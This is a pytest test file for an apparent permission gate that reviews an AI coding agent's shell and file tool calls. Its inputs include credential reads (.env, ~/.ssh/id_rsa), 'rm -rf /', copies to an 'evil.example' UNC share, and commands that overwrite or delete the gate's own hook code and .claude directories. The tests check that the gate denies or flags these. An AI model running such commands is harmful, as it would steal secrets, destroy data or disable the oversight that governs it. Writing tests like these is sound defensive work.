"""Review round 2, M-1 (budget), M-12 (UNC / WebDAV) and M-4 (runtime guard rules).

Fake machines are purely lexical, so they behave the same on every host; PowerShell command lines
go through the real parser helper and run on a Windows host only (``conftest`` warms it up).
Nothing here executes the parsed text.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path
from typing import Any

import pytest

import boundkeep
from boundkeep import install
from boundkeep import paths as bk_paths
from boundkeep.daemon import pipeline
from boundkeep.normalize import event as ev
from boundkeep.normalize import paths
from boundkeep.normalize.model import Action
from boundkeep.policy import Policy, default_policy_text, evaluate, parse_policy_text

needs_ps = pytest.mark.skipif(sys.platform != "win32", reason="needs the PowerShell parser helper")

WIN: dict[str, Any] = {
    "platform": "windows",
    "home": "C:\\Users\\bob",
    "cwd": "C:\\Users\\bob\\proj",
    "env": {"USERPROFILE": "C:\\Users\\bob", "COMPUTERNAME": "BOBPC"},
}
NIX: dict[str, Any] = {
    "platform": "posix",
    "home": "/home/bob",
    "cwd": "/home/bob/proj",
    "env": {"HOME": "/home/bob"},
}


@pytest.fixture(scope="module")
def win_policy() -> Policy:
    return parse_policy_text(default_policy_text(), home=WIN["home"])


@pytest.fixture(scope="module")
def nix_policy() -> Policy:
    return parse_policy_text(default_policy_text(), home=NIX["home"])


def norm(world: dict[str, Any], tool: str, tool_input: dict[str, Any], **kw: Any) -> list[Action]:
    payload = {
        "tool_name": tool,
        "tool_input": tool_input,
        "cwd": world["cwd"],
        "project_dir": world["cwd"],
    }
    return ev.normalize_event(
        payload, platform=world["platform"], env=world["env"], home=world["home"], **kw
    )


def decide(
    world: dict[str, Any], policy: Policy, tool: str, tool_input: dict[str, Any], **kw: Any
) -> str:
    return evaluate(
        policy, norm(world, tool, tool_input, **kw), platform=world["platform"]
    ).decision


def _host() -> tuple[dict[str, Any], Policy, str]:
    """(world, default policy, home with forward slashes) of the machine running the test."""
    world = WIN if sys.platform == "win32" else NIX
    policy = parse_policy_text(default_policy_text(), home=world["home"])
    return world, policy, world["home"].replace("\\", "/")


def sh(command: str) -> dict[str, Any]:
    return {"command": command}


def reasons(actions: list[Action]) -> set[str]:
    return {r for a in actions for r in a.gray_reasons}


# --- M-1: the budget never turns a visible deny into a gray ---------------------------------------


@pytest.mark.parametrize(
    "world_name", [pytest.param("win", id="win"), pytest.param("nix", id="nix")]
)
def test_300_commands_then_a_secret_read_is_still_denied(
    world_name: str, win_policy: Policy, nix_policy: Policy
) -> None:
    world, policy = (WIN, win_policy) if world_name == "win" else (NIX, nix_policy)
    for filler in ("true; ", "ls; "):
        command = filler * 300 + "cat .env"
        actions = norm(world, "Bash", sh(command))
        assert "budget:actions" in reasons(actions)
        assert actions[-1].gray  # the marker stays last
        assert decide(world, policy, "Bash", sh(command)) == "deny", filler
    # just under the cap it was always a deny
    assert decide(world, policy, "Bash", sh("true; " * 255 + "cat .env")) == "deny"


def test_the_command_that_trips_the_budget_is_classified_lexically(
    win_policy: Policy, monkeypatch: pytest.MonkeyPatch
) -> None:
    # (the host's own flavor: disk lookups only happen for paths of the machine running the test)
    world, policy, home = _host()
    monkeypatch.setattr(ev, "MAX_DISK_KEYS", 4)
    words = " ".join(f"p{i}" for i in range(10))
    command = f"cat {words} {home}/.ssh/id_rsa"
    actions = norm(world, "Bash", sh(command))
    assert "budget:disk-lookups" in reasons(actions)
    keys = {r.key for a in actions for r in a.paths}
    assert f"{home.casefold() if sys.platform == 'win32' else home}/.ssh/id_rsa" in keys
    assert evaluate(policy, actions, platform=world["platform"]).decision == "deny"


def test_later_commands_are_classified_after_the_disk_budget_ran_out(
    win_policy: Policy, monkeypatch: pytest.MonkeyPatch
) -> None:
    world, policy, home = _host()
    monkeypatch.setattr(ev, "MAX_DISK_KEYS", 2)
    command = f"cat a b c d e f; cat {home}/.ssh/id_rsa; rm -rf /c/Windows/x"
    actions = norm(world, "Bash", sh(command))
    assert actions[-1].gray_reasons == ("normalize-budget-exceeded", "budget:disk-lookups")
    assert [a.program for a in actions[:-1]] == ["cat", "cat", "rm"]
    verdict = evaluate(policy, actions, platform=world["platform"])
    assert verdict.decision == "deny"
    assert {"no-credential-store-read", "rm-outside-project"} <= set(verdict.rule_ids)


def test_a_rule_that_needs_no_path_still_matches_after_the_budget(
    win_policy: Policy, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(ev, "MAX_DISK_KEYS", 2)
    command = "cat a b c d e f g; reg add HKCU\\Software\\X"
    assert decide(WIN, win_policy, "Bash", sh(command)) == "ask"


def test_nothing_after_the_budget_touches_the_disk(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = tmp_path / "home"
    proj = home / "proj"
    proj.mkdir(parents=True)
    for i in range(30):
        (proj / f"g{i}.txt").write_text("x", encoding="utf-8")
    world = {
        "platform": "windows" if sys.platform == "win32" else "posix",
        "home": str(home),
        "cwd": str(proj),
        "env": {"USERPROFILE": str(home)} if sys.platform == "win32" else {"HOME": str(home)},
    }
    monkeypatch.setattr(ev, "MAX_DISK_KEYS", 2)
    calls: list[str] = []
    scans: list[str] = []
    real = paths.resolve_on_disk
    monkeypatch.setattr(paths, "resolve_on_disk", lambda p: calls.append(p.key) or real(p))
    monkeypatch.setattr(
        paths, "expand_glob", lambda *a, **k: scans.append("glob") or paths.GlobResult((), "none")
    )
    command = "cat a b c d e f; " + "cat *.txt x1 x2 x3 x4 x5; " * 5
    actions = norm(world, "Bash", sh(command))
    assert actions[-1].gray_reasons[-1] == "budget:disk-lookups"
    assert len(calls) <= 3  # the first command's lookups only (the project root's own included)
    assert scans == []  # no glob expansion in lexical mode
    globs = [r for a in actions for r in a.paths if "glob" in r.reasons]
    assert globs  # the glob words are still there, as uncertain lexical paths
    assert all(r.uncertain for r in globs)


def test_glob_matches_have_a_disk_budget_of_their_own(tmp_path: Path) -> None:
    home = tmp_path / "home"
    proj = home / "proj"
    proj.mkdir(parents=True)
    for i in range(120):
        (proj / f"f{i:03}.txt").write_text("x", encoding="utf-8")
    world = {
        "platform": "windows" if sys.platform == "win32" else "posix",
        "home": str(home),
        "cwd": str(proj),
        "env": {"USERPROFILE": str(home)} if sys.platform == "win32" else {"HOME": str(home)},
    }
    actions = norm(world, "Bash", sh("cat *.txt; cat y1 y2 y3 y4 y5 y6"))
    assert "normalize-budget-exceeded" not in reasons(actions)  # used to run out of lookups
    assert "glob-too-many-matches" in reasons(actions)


def test_a_time_budget_of_zero_keeps_every_command(win_policy: Policy) -> None:
    command = "echo a; cat .env"
    actions = norm(WIN, "Bash", sh(command), budget_s=0.0)
    assert [a.program for a in actions[:-1]] == ["echo", "cat"]
    assert "budget:time" in reasons(actions)
    assert decide(WIN, win_policy, "Bash", sh(command), budget_s=0.0) == "deny"


def test_the_lexical_pass_has_no_count_cap_and_the_marker_stays(
    win_policy: Policy, monkeypatch: pytest.MonkeyPatch
) -> None:
    # (round 3: the cap of 1024 further actions is gone; every distinct command is classified)
    monkeypatch.setattr(ev, "MAX_ACTIONS", 2)
    command = "; ".join(f"cat f{i}" for i in range(20))
    actions = norm(WIN, "Bash", sh(command))
    assert len(actions) == 2 + 18 + 1
    assert actions[-1].gray
    assert evaluate(win_policy, actions, platform="windows").decision == "gray"


def test_an_identical_command_after_the_budget_adds_no_action() -> None:
    actions = norm(WIN, "Bash", sh("echo a; " * 400))
    assert len(actions) == ev.MAX_ACTIONS + 1


def test_the_lexical_pass_keeps_the_working_directory(
    win_policy: Policy, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(ev, "MAX_DISK_KEYS", 1)
    command = "cat a b c; cd C:/Windows && rm -rf x"
    assert decide(WIN, win_policy, "Bash", sh(command)) == "deny"


def test_a_budget_marker_can_never_be_an_allow(win_policy: Policy) -> None:
    actions = norm(WIN, "Bash", sh("true; " * 300))
    assert evaluate(win_policy, actions, platform="windows").decision == "gray"


def test_time_budget_exhaustion_in_a_non_shell_tool_is_still_one_gray_action() -> None:
    got = norm(WIN, "Read", {"file_path": "x"}, budget_s=0.0)
    assert len(got) == 1
    assert got[0].gray


# --- M-12: UNC and WebDAV paths are network access -----------------------------------------------


def test_unc_server_extraction() -> None:
    ctx = ev._Ctx(
        platform="windows",
        env={"COMPUTERNAME": "BobPC"},
        home=None,
        cwd=None,
        root=None,
        root_resolved=None,
        base={"platform": "windows"},
        budget=ev._Budget(deadline=1e18),
    )
    f = ev._unc_server
    assert f(ctx, "//evil.example/s/x") == "evil.example"
    assert f(ctx, "//evil.example@80/davwwwroot/x") == "evil.example"
    assert f(ctx, "//evil.example@ssl@8443/davwwwroot/x") == "evil.example"
    assert f(ctx, "//192.0.2.1/s") == "192.0.2.1"
    for local in (
        "//localhost/s/x",
        "//127.0.0.1/s",
        "//::1/s",
        "//wsl$/ubuntu/etc",
        "//wsl.localhost/ubuntu",
        "//bobpc/share/x",
        "//BOBPC/share/x",
        "//./nul",
        "//./pipe/x",
        "c:/users/bob",
        "/home/bob",
        "relative/path",
    ):
        assert f(ctx, local) is None, local


@pytest.mark.parametrize(
    ("command", "host"),
    [
        ("cat //evil.example/s/x", "evil.example"),
        ("cp a //evil.example/s/a", "evil.example"),
        ("cat //evil.example@80/DavWWWRoot/x", "evil.example"),
        ("cat //evil.example@SSL@8443/DavWWWRoot/x", "evil.example"),
        ("cat //192.0.2.1/s/x", "192.0.2.1"),
        ("cat //EVIL.example/s/x", "evil.example"),
    ],
)
def test_a_unc_path_in_bash_on_windows_is_a_network_action(
    command: str, host: str, win_policy: Policy
) -> None:
    actions = norm(WIN, "Bash", sh(command))
    unc = [a for a in actions if a.network]
    assert unc, command
    assert unc[0].domains == (host,)
    assert "network_egress" in unc[0].risk_tags
    assert "unc-network" in unc[0].gray_reasons
    assert evaluate(win_policy, actions, platform="windows").decision == "ask"
    assert "net-allowlist" in evaluate(win_policy, actions, platform="windows").rule_ids


@needs_ps
@pytest.mark.parametrize(
    ("command", "host"),
    [
        (r"Get-Content \\evil.example\s\x", "evil.example"),
        (r"Copy-Item .\a \\evil.example\s\a", "evil.example"),
        (r"Get-Content \\evil.example@80\DavWWWRoot\x", "evil.example"),
        (r"Get-Content \\evil.example@SSL\DavWWWRoot\x", "evil.example"),
        (r"Test-Path \\192.0.2.1\s\x", "192.0.2.1"),
        (r"Get-Content //evil.example/s/x", "evil.example"),
        (r"Set-Content \\evil.example\s\x 'a'", "evil.example"),
        (r"Get-ChildItem \\evil.example\s", "evil.example"),
    ],
)
def test_a_unc_path_in_powershell_is_a_network_action(
    command: str, host: str, win_policy: Policy
) -> None:
    actions = norm(WIN, "PowerShell", sh(command))
    unc = [a for a in actions if a.network]
    assert unc, command
    assert host in unc[0].domains
    assert "unc-network" in unc[0].gray_reasons
    verdict = evaluate(win_policy, actions, platform="windows")
    assert verdict.decision == "ask", command
    assert "net-allowlist" in verdict.rule_ids


@needs_ps
@pytest.mark.parametrize(
    "command",
    [
        r"Get-Content \\localhost\share\x",
        r"Get-Content \\127.0.0.1\share\x",
        r"Get-Content \\BOBPC\share\x",
        r"Get-Content \\wsl$\Ubuntu\etc\hosts",
        r"Get-Content \\wsl.localhost\Ubuntu\etc\hosts",
        r"Get-Content \\localhost\c$\x",
        r"Get-Content C:\Users\bob\proj\a.txt",
    ],
)
def test_local_unc_forms_are_not_network(command: str) -> None:
    actions = norm(WIN, "PowerShell", sh(command))
    assert not any(a.network for a in actions), command
    assert "unc-network" not in reasons(actions)


@needs_ps
def test_a_unc_host_on_the_allowlist_is_still_gray_never_allow(win_policy: Policy) -> None:
    actions = norm(WIN, "PowerShell", sh(r"Get-Content \\github.com\s\x"))
    assert actions[0].domains == ("github.com",)
    assert "unc-network" in actions[0].gray_reasons
    assert evaluate(win_policy, actions, platform="windows").decision != "allow"


def test_the_file_tools_treat_a_unc_path_as_network(win_policy: Policy) -> None:
    for tool, tool_input in (
        ("Read", {"file_path": "\\\\evil.example\\s\\x"}),
        ("Write", {"file_path": "\\\\evil.example\\s\\x", "content": "x"}),
        ("Edit", {"file_path": "//evil.example/s/x", "old_string": "a", "new_string": "b"}),
        ("Grep", {"pattern": "x", "path": "\\\\evil.example\\s"}),
        ("Glob", {"pattern": "*", "path": "\\\\evil.example@80\\DavWWWRoot"}),
    ):
        actions = norm(WIN, tool, tool_input)
        assert actions[0].network, tool
        assert actions[0].domains == ("evil.example",), tool
        assert "unc-network" in actions[0].gray_reasons, tool
        verdict = evaluate(win_policy, actions, platform="windows")
        assert verdict.decision == "ask", tool


def test_double_slash_is_a_local_path_on_a_posix_machine() -> None:
    actions = norm(NIX, "Bash", sh("cat //evil.example/s/x"))
    assert not any(a.network for a in actions)
    assert "unc-network" not in reasons(actions)


def test_a_local_drive_admin_share_is_not_network() -> None:
    actions = norm(WIN, "Read", {"file_path": "\\\\localhost\\c$\\x"})
    assert not actions[0].network
    assert actions[0].paths[0].key == "c:/x"


# --- M-4: rules for what the gate runs from -----------------------------------------------------


@pytest.fixture
def bare() -> Policy:
    return parse_policy_text("version: 1\n", home=WIN["home"])


@pytest.fixture
def bk_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    home = tmp_path / "bkhome"
    monkeypatch.setenv(bk_paths.HOME_ENV, str(home))
    monkeypatch.setattr(bk_paths, "_home_pinned", None)
    return home


def _in_project(rel: str) -> str:
    """A path inside the project of the host's flavor (see ``_decide_here``)."""
    base = "E:\\proj" if sys.platform == "win32" else "/home/bob/proj"
    return os.path.join(base, *rel.split("/")) if rel else base


def _decide_here(policy: Policy, tool: str, tool_input: dict[str, Any]) -> pipeline.Review:
    # The cwd must be of the host's flavor: a Windows cwd would make every "/tmp/..." path a
    # drive-relative (uncertain) one on a POSIX machine.
    world = WIN if sys.platform == "win32" else NIX
    project = _in_project("")
    payload = {
        "tool_name": tool,
        "tool_input": tool_input,
        "cwd": project,
        "project_dir": project,
    }
    return pipeline.review(
        payload,
        policy,
        platform=world["platform"],
        env=world["env"],
        home=world["home"],
        scan_disk=False,
    )


PKG = os.path.dirname(os.path.abspath(boundkeep.__file__))
FPKG = PKG.replace("\\", "/")  # for bash command lines: backslashes escape there


@pytest.mark.parametrize(
    ("tool", "tool_input"),
    [
        ("Write", {"file_path": os.path.join(PKG, "hook_main.py"), "content": "x"}),
        ("Write", {"file_path": os.path.join(PKG, "hook_client.py"), "content": "x"}),
        (
            "Edit",
            {
                "file_path": os.path.join(PKG, "policy", "loader.py"),
                "old_string": "a",
                "new_string": "b",
            },
        ),
        ("MultiEdit", {"file_path": os.path.join(PKG, "daemon", "pipeline.py"), "edits": []}),
        ("Write", {"file_path": os.path.join(PKG, "newfile.py"), "content": "x"}),
        ("Bash", {"command": f"echo x >> {FPKG}/hook_main.py"}),
        ("Bash", {"command": f"cp evil.py {FPKG}/hook_main.py"}),
        ("Bash", {"command": f"rm {FPKG}/hook_main.py"}),
        ("Bash", {"command": f"mv {FPKG} {FPKG}.old"}),
        ("Write", {"file_path": os.path.abspath(sys.executable), "content": "x"}),
    ],
)
def test_the_installed_code_and_interpreter_cannot_be_written(
    tool: str, tool_input: dict[str, Any], bare: Policy, bk_home: Path
) -> None:
    guarded = pipeline.runtime_policy(bare, os.environ, None)
    assert _decide_here(bare, tool, tool_input).verdict.decision != "deny"
    review = _decide_here(guarded, tool, tool_input)
    assert review.verdict.decision == "deny", tool_input
    assert "protect-guard-code" in review.verdict.rule_ids


@needs_ps
@pytest.mark.parametrize(
    "command",
    [
        f"Set-Content {os.path.join(PKG, 'hook_client.py')} x",
        f"Add-Content {os.path.join(PKG, 'hook_main.py')} x",
        f"Remove-Item {os.path.join(PKG, 'hook_main.py')}",
        f"Rename-Item {PKG} old",
        f"Copy-Item evil.py {os.path.join(PKG, 'policy', 'loader.py')}",
    ],
)
def test_the_installed_code_cannot_be_written_from_powershell(
    command: str, bare: Policy, bk_home: Path
) -> None:
    guarded = pipeline.runtime_policy(bare, os.environ, None)
    assert _decide_here(guarded, "PowerShell", sh(command)).verdict.decision == "deny"


def test_reading_the_installed_code_is_not_blocked(bare: Policy, bk_home: Path) -> None:
    guarded = pipeline.runtime_policy(bare, os.environ, None)
    for tool, tool_input in (
        ("Read", {"file_path": os.path.join(PKG, "hook_main.py")}),
        ("Bash", {"command": f"cat {os.path.join(PKG, 'hook_main.py')}"}),
    ):
        assert _decide_here(guarded, tool, tool_input).verdict.decision != "deny"
    other = _decide_here(guarded, "Write", {"file_path": _in_project("a.py"), "content": "x"})
    assert other.verdict.decision != "deny"


def test_boundkeeps_home_is_protected_even_when_it_is_moved(bare: Policy, bk_home: Path) -> None:
    guarded = pipeline.runtime_policy(bare, os.environ, None)
    for tool, tool_input in (
        ("Write", {"file_path": str(bk_home / "policy.yaml"), "content": "x"}),
        ("Write", {"file_path": str(bk_home / "logs" / "audit.jsonl"), "content": "x"}),
        ("Bash", {"command": f"rm -rf {bk_home.as_posix()}"}),
        ("Bash", {"command": f"mv {bk_home.as_posix()} {bk_home.as_posix()}.old"}),
    ):
        review = _decide_here(guarded, tool, tool_input)
        assert review.verdict.decision == "deny", tool_input


@pytest.mark.parametrize(
    "command",
    [
        "mv ~/.claude ../x",
        "mv ~/.claude ~/x",
        "rm -rf .claude",
        "rm -r ~/.claude",
        "mkdir .claude",
        "touch .claude",
    ],
)
def test_the_claude_directories_themselves_cannot_be_moved_or_deleted(
    command: str, bare: Policy, bk_home: Path
) -> None:
    guarded = pipeline.runtime_policy(bare, os.environ, None)
    review = _decide_here(guarded, "Bash", sh(command))
    assert review.verdict.decision == "deny", command
    assert "protect-guard-dirs" in review.verdict.rule_ids


@needs_ps
@pytest.mark.parametrize(
    "command",
    [
        r"Rename-Item ~\.claude x",
        r"Move-Item ~\.claude C:\tmp",
        r"Remove-Item -Recurse .claude",
        r"robocopy C:\empty .claude /mir",
        r"Remove-Item -Recurse -Force ~\.boundkeep",
    ],
)
def test_the_claude_directories_cannot_be_moved_or_deleted_from_powershell(
    command: str, bare: Policy, bk_home: Path
) -> None:
    guarded = pipeline.runtime_policy(bare, os.environ, None)
    review = _decide_here(guarded, "PowerShell", sh(command))
    assert review.verdict.decision == "deny", command


def test_files_inside_the_claude_directory_are_not_matched_by_the_directory_rule(
    bare: Policy, bk_home: Path
) -> None:
    guarded = pipeline.runtime_policy(bare, os.environ, None)
    review = _decide_here(
        guarded, "Write", {"file_path": _in_project(".claude/commands/x.md"), "content": "x"}
    )
    assert "protect-guard-dirs" not in review.verdict.rule_ids


def test_the_recorded_interpreter_and_hook_script_are_protected(
    bare: Policy, bk_home: Path, tmp_path: Path
) -> None:
    exe = tmp_path / "tools" / "python-custom.exe"
    script = tmp_path / "tools" / "my_hook_client.py"
    exe.parent.mkdir()
    record = install.InstallRecord(
        settings_path=str(tmp_path / "s.json"),
        scope="project",
        created_file=False,
        hook_command=str(exe),
        hook_args=("-I", "-S", str(script), "--home", str(bk_home), "pre"),
        post_matcher="",
        installed_at="2026-01-01T00:00:00Z",
    )
    bk_home.mkdir(parents=True)
    install.save_manifest(bk_paths.manifest_file(), [record])
    guarded = pipeline.runtime_policy(bare, os.environ, None)
    for target in (exe, script):
        review = _decide_here(guarded, "Write", {"file_path": str(target), "content": "x"})
        assert review.verdict.decision == "deny", target
    unrelated = _decide_here(
        guarded, "Write", {"file_path": str(tmp_path / "tools" / "other.py"), "content": "x"}
    )
    assert unrelated.verdict.decision != "deny"


def test_a_corrupt_manifest_only_means_fewer_protected_paths(bare: Policy, bk_home: Path) -> None:
    bk_home.mkdir(parents=True)
    Path(bk_paths.manifest_file()).write_text("{not json", encoding="utf-8")
    guarded, error = pipeline.runtime_policy_checked(bare, os.environ, None)
    assert error is None
    assert [r.id for r in guarded.rules[:2]] == ["protect-guard-code", "protect-guard-dirs"]


def test_the_config_dir_itself_cannot_be_moved(bare: Policy, bk_home: Path) -> None:
    env = {**os.environ, "CLAUDE_CONFIG_DIR": "D:\\cfg\\claude"}
    guarded = pipeline.runtime_policy(bare, env, None)
    payload = {
        "tool_name": "Bash",
        "tool_input": sh("mv D:/cfg/claude D:/cfg/old"),
        "cwd": "E:\\proj",
        "project_dir": "E:\\proj",
    }
    review = pipeline.review(
        payload, guarded, platform="windows", env=env, home="C:\\Users\\bob", scan_disk=False
    )
    assert review.verdict.decision == "deny"
    assert "protect-guard-dirs" in review.verdict.rule_ids


def test_runtime_policy_is_idempotent_and_never_loses_a_deny(
    win_policy: Policy, bk_home: Path
) -> None:
    once, error = pipeline.runtime_policy_checked(win_policy, os.environ, WIN["home"])
    assert error is None
    twice, error = pipeline.runtime_policy_checked(once, os.environ, WIN["home"])
    assert (twice, error) == (once, None)
    assert len(once.rules) == len(win_policy.rules) + 2
    for command in ("rm -rf /", "cat ~/.ssh/id_rsa"):
        assert decide(WIN, once, "Bash", sh(command)) == "deny"


def test_a_failure_building_the_guard_rules_is_reported_not_raised(
    win_policy: Policy, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom() -> Any:
        raise RuntimeError("secret-content")

    monkeypatch.setattr(pipeline, "_installed_paths", boom)
    same, error = pipeline.runtime_policy_checked(win_policy, {}, None)
    assert same is win_policy
    assert error is not None
    assert "secret-content" not in error
    assert error.isprintable()
